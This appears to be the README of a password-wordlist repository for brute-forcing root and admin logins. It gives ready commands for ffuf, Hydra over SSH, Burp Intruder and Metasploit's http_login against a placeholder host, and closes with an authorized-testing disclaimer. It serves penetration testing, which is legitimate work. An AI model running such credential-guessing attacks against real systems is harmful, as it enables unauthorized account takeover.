```text
# 🎯 root-auth-wordlist

> Curated wordlists designed for brute-force assessment scenarios targeting central control panels and administrative login interfaces using common root/admin usernames (root, admin, Admin).

---

## 📂 Wordlist Variants

* root-password_small.txt - Fast, high-probability wordlist for quick assessments.
* root-password_medium.txt - Balanced wordlist covering common administrative patterns.
* root-password_large.txt - Comprehensive wordlist for deep brute-force scenarios.

---

## 🚀 Usage Examples

### 1. FFUF (Web Admin Login)
ffuf -u http://target.com/admin/login -X POST -d "username=admin&password=FUZZ" -w root-password_small.txt -mc 200,302

### 2. THC-Hydra (SSH / Service Auth)
hydra -l root -P root-password_medium.txt ssh://target.com

### 3. Burp Suite Intruder
- Send the login HTTP request to Intruder.
- Set the payload position on the password parameter (password=§FUZZ§).
- Load root-password_small.txt (or medium/large) under Payload Options.
- Start the attack.

### 4. Metasploit (HTTP Login Brute-Force)
use auxiliary/scanner/http/http_login
set RHOSTS target.com
set TARGETURI /admin/login
set USER_FILE usernames.txt
set PASS_FILE root-password_large.txt
run

---

## 🤝 Updates & Contact
For updates and security research discussions:
X (Twitter): @holhsu

---

## ⚠️ Disclaimer
This repository is created for authorized penetration testing and security research only. Usage against targets without prior authorization is strictly illegal.
```
